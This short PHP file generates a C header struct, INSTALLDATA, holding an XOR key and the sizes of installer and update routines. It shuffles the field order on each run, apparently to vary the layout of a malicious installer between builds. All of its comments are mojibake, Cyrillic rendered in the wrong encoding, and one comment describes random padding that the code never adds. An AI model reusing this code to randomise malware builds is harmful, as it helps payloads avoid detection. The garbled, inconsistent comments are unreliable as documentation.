<?php
///////////////////////////////////////////////////////////////////////////////////////////////////
// Р“РµРЅРµСЂР°С†РёСЏ СЃС‚СЂСѓРєС‚СѓСЂС‹ INSTALLDATA.
///////////////////////////////////////////////////////////////////////////////////////////////////  

/*  
  Р“РµРЅРµСЂР°С†РёСЏ СЃС‚СЂСѓРєС‚СѓСЂС‹ BASECONFIG.

  Return - СЃРѕРґРµСЂР¶РёРјРѕРµ h-С„Р°Р№Р»Р°.
*/
function generateInstallData()
{
  $vars = array
  (
    "DWORD xorKey;      //РљР»СЋС‡ С€РёС„СЂРѕРІР°РЅРёСЏ.",
    "DWORD installSize; //Р Р°Р·РјРµСЂ CoreInstall::_install().",
    "DWORD updateSize;  //Р Р°Р·РјРµСЂ CoreInstall::_update()."
  );

  //РџРµСЂРµРјРµС€РёРІР°РµРј Р·РЅР°С‡РµРЅРёСЏ.
  shuffle($vars);

  //Р”РѕР±РѕРІР»СЏРµРј РїРµСЂРµРґ РєР°Р¶РґС‹Рј Р·РЅР°С‡РµРЅРёРµРј СЃС‚СЂСѓРєС‚СѓСЂС‹, РїСЂРѕРёР·РІРѕР»РЅС‹Р№ Р±СѓС„С„РµСЂ.
  $outputStruct = implode("\r\n  ", $vars);

  //Р’С‹РІРѕРґРёРј.
  return "typedef struct\r\n{\r\n  {$outputStruct}\r\n}INSTALLDATA;\r\n";
}
?>